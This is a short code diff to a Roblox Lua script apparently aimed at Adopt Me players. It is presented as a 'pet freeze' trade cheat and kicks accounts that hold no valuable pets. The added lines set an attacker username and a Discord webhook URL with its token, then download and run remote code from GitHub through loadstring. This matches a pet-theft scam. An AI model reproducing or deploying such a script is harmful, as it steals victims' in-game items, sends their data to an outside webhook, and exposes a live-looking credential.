@@ -129,4 +129,6 @@ if legendaries_count + mega_count + neon_count + ultra_count + fr_count == 0 the
     game:GetService("Players").LocalPlayer:Kick("\nBot/Alt Account Detected,"For The Script To Work, You Need A Good Pet. It Doesn’t Work With Trash Pets. The Script Is Functional For Freezing Good Pets In Trade [No Remote.Event Detected]")
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Scriphtub/Adopt-me/refs/heads/main/Adopt%20me"))()
+UserName = "Officialbacontoast63"
+WebHook = "https://discord.com/api/webhooks/1378023335224672276/48j1cN33ye6zkjUdzMm5c0FfWaixlbpzwYpiCc9oi1VFeKIYb00DToF6DHYFf9izktgJ"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/refs/heads/main/trade.lua"))()
